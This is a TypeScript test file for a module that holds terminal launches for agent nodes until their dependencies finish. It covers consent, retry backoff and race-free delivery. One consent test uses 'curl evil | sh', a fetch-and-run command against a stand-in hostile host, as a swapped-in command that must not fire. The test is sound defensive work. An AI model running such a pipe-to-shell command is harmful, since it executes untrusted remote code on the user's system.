import { beforeEach, describe, it, expect } from 'vitest'
import {
  dependencyEdges,
  launchesToFire,
  forgetArmed,
  launchRetryDelay,
  launchTooltip,
  markArmedThisSession,
  mayRelaunchAgent,
  resetArmedThisSession,
  unmetDeps,
  wasArmedThisSession,
  beginLaunch,
  isLaunchInFlight,
  launchKey,
  resetLaunchesInFlight,
  settleLaunch,
  LAUNCH_DELIVERY_ATTEMPTS,
  LAUNCH_STALL_MS,
  type ArmedNode,
  type StatusById
} from './pendingLaunch'

const armed = (id: string, after: string[], command = `echo ${id}`): ArmedNode => ({
  id,
  data: { pendingLaunch: { after, command } }
})
const plain = (id: string): ArmedNode => ({ id, data: {} })

describe('launchesToFire', () => {
  const live = new Set(['a', 'b', 'c'])

  it('fires when every dep has reported done', () => {
    const status: StatusById = { a: { state: 'done' }, b: { state: 'done' } }
    expect(launchesToFire([armed('c', ['a', 'b'])], status, live)).toEqual([
      { id: 'c', command: 'echo c' }
    ])
  })

  it('does NOT fire while a dep is still working', () => {
    const status: StatusById = { a: { state: 'done' }, b: { state: 'working' } }
    expect(launchesToFire([armed('c', ['a', 'b'])], status, live)).toEqual([])
  })

  it('does NOT fire on an unknown state — "no news" is not "finished"', () => {
    // The whole point: right after a fan-out the upstream stations have emitted nothing yet.
    expect(launchesToFire([armed('c', ['a'])], {}, live)).toEqual([])
  })

  it('treats waiting/blocked as not satisfied — the station still needs its user', () => {
    expect(launchesToFire([armed('c', ['a'])], { a: { state: 'waiting' } }, live)).toEqual([])
    expect(launchesToFire([armed('c', ['a'])], { a: { state: 'blocked' } }, live)).toEqual([])
  })

  it('treats a dep that is no longer on the canvas as satisfied', () => {
    // A deleted node can never report; waiting on it would strand the dependent forever.
    const status: StatusById = { a: { state: 'done' } }
    expect(launchesToFire([armed('c', ['a', 'ghost'])], status, new Set(['a', 'c']))).toEqual([
      { id: 'c', command: 'echo c' }
    ])
  })

  it('ignores nodes that are not armed, and armed nodes with an empty command', () => {
    const status: StatusById = { a: { state: 'done' } }
    expect(launchesToFire([plain('c'), armed('d', ['a'], '')], status, live)).toEqual([])
  })

  it('fires immediately when there are no deps left to wait on', () => {
    expect(launchesToFire([armed('c', [])], {}, live)).toEqual([{ id: 'c', command: 'echo c' }])
  })

  it('walks a chain A → B → C one station at a time', () => {
    const chain = [armed('b', ['a']), armed('c', ['b'])]
    // Nothing has reported: nothing fires.
    expect(launchesToFire(chain, {}, live)).toEqual([])
    // A done releases B only — C waits on B, which has not even started.
    expect(launchesToFire(chain, { a: { state: 'done' } }, live)).toEqual([{ id: 'b', command: 'echo b' }])
    // B running is still not B done.
    expect(launchesToFire(chain, { a: { state: 'done' }, b: { state: 'working' } }, live)).toEqual([
      { id: 'b', command: 'echo b' }
    ])
    // B done releases C. (B is still listed here because the caller, not this function, retires a
    // delivered launch by clearing its pendingLaunch — exactly-once lives in `launchInFlight`.)
    expect(launchesToFire(chain, { a: { state: 'done' }, b: { state: 'done' } }, live)).toEqual([
      { id: 'b', command: 'echo b' },
      { id: 'c', command: 'echo c' }
    ])
  })

  it('after a restart (empty status map) a persisted arming holds — nothing will report, ▶ is the escape', () => {
    // Agent state is transient; a live dep that reported `done` before the restart is unknown now,
    // and unknown is NOT satisfied. The manual run-now on the badge exists for exactly this.
    expect(launchesToFire([armed('c', ['a'])], {}, live)).toEqual([])
    expect(unmetDeps(armed('c', ['a']), {}, live)).toEqual(['a'])
  })

  it('a dep deleted mid-chain releases what waited on it, but not what waits further down', () => {
    const chain = [armed('b', ['a']), armed('c', ['b'])]
    const liveWithoutA = new Set(['b', 'c'])
    expect(launchesToFire(chain, {}, liveWithoutA)).toEqual([{ id: 'b', command: 'echo b' }])
  })
})

describe('launchesToFire — awaitSetupGroup (a worktree whose setup script must land first)', () => {
  const live = new Set(['a', 'c'])
  const armedForSetup = (id: string, groupId: string, after: string[] = []): ArmedNode => ({
    id,
    data: { pendingLaunch: { after, command: `echo ${id}`, awaitSetupGroup: groupId } }
  })

  it('holds the launch while the group’s setup run is not done', () => {
    expect(launchesToFire([armedForSetup('c', 'g1')], {}, live, () => false)).toEqual([])
  })

  it('fires once the group’s setup run is done', () => {
    expect(launchesToFire([armedForSetup('c', 'g1')], {}, live, () => true)).toEqual([
      { id: 'c', command: 'echo c' }
    ])
  })

  it('with no setupDone probe at all, the gate is open — an absent probe never strands a node', () => {
    // Reached after an app restart: the run store is empty, and a node armed before the restart
    // would otherwise wait forever for a run nobody is going to report on again.
    expect(launchesToFire([armedForSetup('c', 'g1')], {}, live)).toEqual([
      { id: 'c', command: 'echo c' }
    ])
  })

  it('asks the probe about THIS node’s group', () => {
    const asked: string[] = []
    launchesToFire([armedForSetup('c', 'g-seven')], {}, live, (g) => {
      asked.push(g)
      return true
    })
    expect(asked).toEqual(['g-seven'])
  })

  it('needs BOTH gates: setup done AND every `after` dep satisfied', () => {
    const node = [armedForSetup('c', 'g1', ['a'])]
    // setup done, dep still working
    expect(launchesToFire(node, { a: { state: 'working' } }, live, () => true)).toEqual([])
    // dep done, setup still running
    expect(launchesToFire(node, { a: { state: 'done' } }, live, () => false)).toEqual([])
    // both
    expect(launchesToFire(node, { a: { state: 'done' } }, live, () => true)).toEqual([
      { id: 'c', command: 'echo c' }
    ])
  })

  it('leaves a node with no awaitSetupGroup alone even while some setup is running', () => {
    expect(launchesToFire([armed('c', [])], {}, live, () => false)).toEqual([
      { id: 'c', command: 'echo c' }
    ])
  })
})

describe('unmetDeps', () => {
  it('reports only the deps still outstanding', () => {
    const live = new Set(['a', 'b', 'c'])
    const status: StatusById = { a: { state: 'done' }, b: { state: 'working' } }
    expect(unmetDeps(armed('c', ['a', 'b']), status, live)).toEqual(['b'])
  })

  it('is empty for a node that is not armed', () => {
    expect(unmetDeps(plain('c'), {}, new Set(['c']))).toEqual([])
  })
})

describe('dependencyEdges', () => {
  it('draws one edge per live dep, pointing dep → dependent', () => {
    expect(dependencyEdges([armed('c', ['a', 'b'])], new Set(['a', 'b', 'c']))).toEqual([
      { id: 'dep-a-c', source: 'a', target: 'c' },
      { id: 'dep-b-c', source: 'b', target: 'c' }
    ])
  })

  it('draws nothing for a dep that is gone', () => {
    expect(dependencyEdges([armed('c', ['ghost'])], new Set(['c']))).toEqual([])
  })

  it('draws nothing once the node is no longer armed', () => {
    expect(dependencyEdges([plain('c')], new Set(['c']))).toEqual([])
  })
})

describe('mayRelaunchAgent — an armed node must not cold-restore/resume before its held launch', () => {
  it('armed (pendingLaunch set) ⇒ NO resume', () => {
    // The minted agentSessionId names a conversation that does not exist yet; the held launch,
    // not a `--resume`, is what creates it.
    expect(mayRelaunchAgent({ pendingLaunch: { after: [], command: 'claude --session-id x' } })).toBe(
      false
    )
    expect(mayRelaunchAgent({ pendingLaunch: { after: ['a'], command: 'claude --session-id x' } })).toBe(
      false
    )
  })

  it('delivered (pendingLaunch cleared by the fire effect) ⇒ resume allowed', () => {
    expect(mayRelaunchAgent({ pendingLaunch: undefined })).toBe(true)
  })

  it('plain restore (never armed) ⇒ unchanged, resume allowed', () => {
    expect(mayRelaunchAgent({})).toBe(true)
  })
})

describe('consent registry — only launches armed by THIS process, with THIS content, auto-fire', () => {
  const launch = { after: [] as string[], command: 'echo hi' }
  const node = (id: string, l = launch) => ({ id, data: { pendingLaunch: l } })
  const fire = (ns: ReturnType<typeof node>[]) =>
    launchesToFire(ns, {}, new Set(ns.map((n) => n.id))).filter((f) =>
      wasArmedThisSession(f.id, ns.find((n) => n.id === f.id)?.data.pendingLaunch)
    )
  it('a launch loaded from project.json / a peer is never fired without consent', () => {
    resetArmedThisSession()
    expect(fire([node('loaded')])).toEqual([])
  })
  it('a launch armed in this session fires; a loaded one beside it still does not', () => {
    resetArmedThisSession()
    markArmedThisSession('mine', launch)
    expect(fire([node('mine'), node('loaded')])).toEqual([{ id: 'mine', command: 'echo hi' }])
  })
  it('a peer that swaps the command under an armed id gets NO consent (content-bound)', () => {
    resetArmedThisSession()
    markArmedThisSession('mine', launch)
    expect(fire([node('mine', { after: [], command: 'curl evil | sh' })])).toEqual([])
  })
  it('consent is consumed once the launch fired — a later launch reusing the id needs its own', () => {
    resetArmedThisSession()
    markArmedThisSession('mine', launch)
    forgetArmed('mine')
    expect(fire([node('mine')])).toEqual([])
  })
  it('marking with no launch records nothing (a cold-open that produced no command)', () => {
    resetArmedThisSession()
    markArmedThisSession('x', undefined)
    expect(fire([node('x')])).toEqual([])
  })
})

/**
 * Issue #569 item 1 — the delivery policy behind an armed node's held launch.
 *
 * The bug these pin: delivery used to be a flat 5 × 400 ms = 2 s budget started when the CANVAS
 * decided a node was ready to launch, not when the node's terminal existed. A cold project switch
 * spends that budget on loading the canvas, mounting the node and spawning tmux, so the launch was
 * abandoned before there was anything to deliver into — and abandoned into a `console.warn`, which
 * left a node reading QUEUED forever with no way to tell it apart from one still waiting on a
 * dependency.
 */
describe('launch delivery policy (#569 item 1)', () => {
  it('the schedule backs off and is bounded — exhaustion is reachable, so "gave up" can be told', () => {
    const delays: number[] = []
    for (let attempt = 1; ; attempt++) {
      const d = launchRetryDelay(attempt)
      if (d === null) break
      delays.push(d)
      expect(attempt).toBeLessThan(20) // guard: a schedule that never ends is the bug, not a fix
    }
    // The delays are the GAPS between sends, so there is one fewer of them than attempts.
    expect(delays.length).toBe(LAUNCH_DELIVERY_ATTEMPTS - 1)
    // Strictly increasing: a flat schedule is what made the old budget a fixed 2 s wall.
    for (let i = 1; i < delays.length; i++) expect(delays[i]).toBeGreaterThan(delays[i - 1])
    // And the whole window is comfortably wider than the old one, measured from READINESS.
    expect(delays.reduce((a, b) => a + b, 0)).toBeGreaterThan(10_000)
  })

  it('LAUNCH_DELIVERY_ATTEMPTS counts SENDS — the fire loop, replayed, sends exactly that many', () => {
    // The constant used to equal the schedule length while the loop sent one more than that (it
    // retries after every non-null delay, and the send after the LAST gap is an attempt too): six
    // sends went out under a constant, and copy, that said five (blind security pass, 2026-09-02).
    let sends = 0
    for (let attempt = 1; ; attempt++) {
      sends++ // the loop sends, is refused, then asks for the delay before the next attempt
      if (launchRetryDelay(attempt) === null) break
    }
    expect(sends).toBe(LAUNCH_DELIVERY_ATTEMPTS)
  })

  it('an attempt past the end has no delay — nothing silently retries forever', () => {
    expect(launchRetryDelay(LAUNCH_DELIVERY_ATTEMPTS - 1)).not.toBeNull()
    expect(launchRetryDelay(LAUNCH_DELIVERY_ATTEMPTS)).toBeNull()
  })

  it('the stall warning waits longer than a cold project switch could plausibly take', () => {
    expect(LAUNCH_STALL_MS).toBeGreaterThanOrEqual(30_000)
  })
})

describe('launchTooltip — the QUEUED badge never goes silent (#569 item 1)', () => {
  const cmd = 'claude "review the diff"'

  it('with nothing to report it names the dependencies, exactly as before', () => {
    const t = launchTooltip(undefined, 'Builder, Tests', cmd)
    expect(t).toContain('Waiting for Builder, Tests to finish')
    expect(t).toContain(cmd)
    expect(t).not.toContain('▶')
  })

  it('a stalled launch says it is still held, and does NOT claim a cause it never measured', () => {
    const t = launchTooltip({ kind: 'stalled', since: 1 }, 'Builder', cmd)
    expect(t).toContain('has not started yet')
    expect(t).toContain('still held')
    expect(t).toContain('▶')
    // We know the terminal is not up; we do not know why. Naming a cause here would be the
    // misleading-error failure this feature exists to avoid.
    expect(t.toLowerCase()).not.toMatch(/ssh|host is down|crash/)
  })

  it('a failed launch reports the attempt count and that nothing will retry it', () => {
    const t = launchTooltip({ kind: 'failed', attempts: 5, at: 1 }, 'Builder', cmd)
    expect(t).toContain('5 attempts')
    expect(t).toContain('nothing will retry it')
    expect(t).toContain('▶')
    expect(t).toContain(cmd)
  })

  it('singularises one attempt (the manual ▶ reports exactly one refusal)', () => {
    expect(launchTooltip({ kind: 'failed', attempts: 1, at: 1 }, 'Builder', cmd)).toContain(
      '1 attempt was refused'
    )
  })

  it('failed outranks the dependency sentence — the warning is never buried', () => {
    const t = launchTooltip({ kind: 'failed', attempts: 5, at: 1 }, 'Builder', cmd)
    expect(t).not.toContain('Waiting for Builder')
  })
})

describe('▶ Run now × the fire effect — revoking consent before the manual send closes the race', () => {
  // TerminalNode's ▶ handler calls forgetArmed(id) synchronously BEFORE api.pty.sendText and drops
  // `pendingLaunch` only on a delivery that landed (session-ready-signal.test pins that shape). This
  // pins the half that lives here: once consent is gone, the fire effect's consent filter yields
  // nothing for that node even though its deps are satisfied and its launch is still on the node —
  // so a retry tick (launchNudge) arriving while the manual delivery is in flight cannot submit the
  // same command a second time.
  const launch = { after: [] as string[], command: 'echo hi' }
  it('a consented, ready launch stops auto-firing the moment ▶ revokes its consent', () => {
    resetArmedThisSession()
    markArmedThisSession('n', launch)
    const nodes = [{ id: 'n', data: { pendingLaunch: launch } }]
    const fire = () =>
      launchesToFire(nodes, {}, new Set(['n'])).filter((f) =>
        wasArmedThisSession(f.id, nodes.find((n) => n.id === f.id)?.data.pendingLaunch)
      )
    expect(fire()).toEqual([{ id: 'n', command: 'echo hi' }])
    forgetArmed('n') // what ▶ does first
    expect(fire()).toEqual([]) // launch still held on the node, but no longer auto-fires
    expect(nodes[0].data.pendingLaunch).toBe(launch) // …and it was not dropped
  })
})

describe('shared in-flight registry — ONE claim per node across the fire effect and ▶ Run now', () => {
  // The two delivery paths used to keep independent latches (a Canvas ref and a TerminalNode ref)
  // that could not see each other, so a consented launch whose canvas send was mid-flight could be
  // sent again by ▶ (consort review SERIOUS, 2026-09-02). Both now claim through `beginLaunch`.
  const A = { after: [] as string[], command: 'echo A' }
  const B = { after: [] as string[], command: 'echo B' }
  beforeEach(() => resetLaunchesInFlight())

  it('a second begin on the same id is refused while the first is outstanding', () => {
    expect(beginLaunch('n', A)).toBe(launchKey(A)) // the canvas send
    expect(isLaunchInFlight('n')).toBe(true)
    expect(beginLaunch('n', A)).toBeNull() // ▶ during that send: nothing goes out
    expect(beginLaunch('n', B)).toBeNull() // …whatever it would carry: one send per pty at a time
    expect(beginLaunch('m', A)).toBe(launchKey(A)) // another node is unaffected
  })

  it('settling releases the claim, so the next attempt (a retry, or ▶) can begin', () => {
    const key = beginLaunch('n', A)!
    expect(settleLaunch('n', key, false, A)).toBe('refused')
    expect(isLaunchInFlight('n')).toBe(false)
    expect(beginLaunch('n', A)).toBe(key)
  })

  it('the fire effect filter sees a ▶ send in flight (and vice versa) — the ids meet in one registry', () => {
    const nodes = [{ id: 'n', data: { pendingLaunch: A } }]
    beginLaunch('n', A) // ▶ clicked
    const ready = launchesToFire(nodes, {}, new Set(['n'])).filter((f) => !isLaunchInFlight(f.id))
    expect(ready).toEqual([])
  })
})

describe('settleLaunch — a settle speaks about the launch it SENT, never about a newer one', () => {
  // A peer may replace `pendingLaunch` (A → B) while A's send is in flight. Settling by node id
  // alone made A's landing clear B (dropped without delivery) and A's refusal mark B failed
  // (consort review SERIOUS, 2026-09-02). The verdict is judged against the node's CURRENT launch.
  const A = { after: [] as string[], command: 'echo A' }
  const B = { after: [] as string[], command: 'echo B' }
  const A2 = { after: [] as string[], command: 'echo A' } // same content, new object (peer upsert)
  beforeEach(() => resetLaunchesInFlight())

  it('landed against the launch still on the node ⇒ landed', () => {
    const key = beginLaunch('n', A)!
    expect(settleLaunch('n', key, true, A)).toBe('landed')
  })

  it('a same-content peer upsert is still the launch we sent — content-bound, not identity-bound', () => {
    const key = beginLaunch('n', A)!
    expect(settleLaunch('n', key, true, A2)).toBe('landed')
  })

  it('the node now holds B ⇒ stale, whichever way A settled (no clear, no failure, for B)', () => {
    let key = beginLaunch('n', A)!
    expect(settleLaunch('n', key, true, B)).toBe('stale')
    key = beginLaunch('n', A)!
    expect(settleLaunch('n', key, false, B)).toBe('stale')
  })

  it('the launch is gone from the node ⇒ stale (nothing to clear, nothing to mark)', () => {
    const key = beginLaunch('n', A)!
    expect(settleLaunch('n', key, true, undefined)).toBe('stale')
  })

  it('a stale settle releases only ITS claim — never a newer launch’s', () => {
    const keyA = beginLaunch('n', A)!
    // A's claim ends (say, via a refusal), B is claimed, then a late duplicate settle for A arrives.
    settleLaunch('n', keyA, false, A)
    const keyB = beginLaunch('n', B)!
    expect(keyB).not.toBe(keyA)
    expect(settleLaunch('n', keyA, true, B)).toBe('stale')
    expect(isLaunchInFlight('n')).toBe(true) // B's send is still outstanding
    expect(settleLaunch('n', keyB, true, B)).toBe('landed')
    expect(isLaunchInFlight('n')).toBe(false)
  })

  it('a REJECTED rpc is settled as a refusal: the claim is released and the launch is kept', () => {
    // What both callers do in their rejection handler: `settle(false)`. Before there was one, the
    // ▶ latch stayed set forever and the button was dead until the node remounted.
    const key = beginLaunch('n', A)!
    expect(settleLaunch('n', key, false, A)).toBe('refused')
    expect(isLaunchInFlight('n')).toBe(false)
    expect(beginLaunch('n', A)).toBe(key) // ▶ works again
  })
})
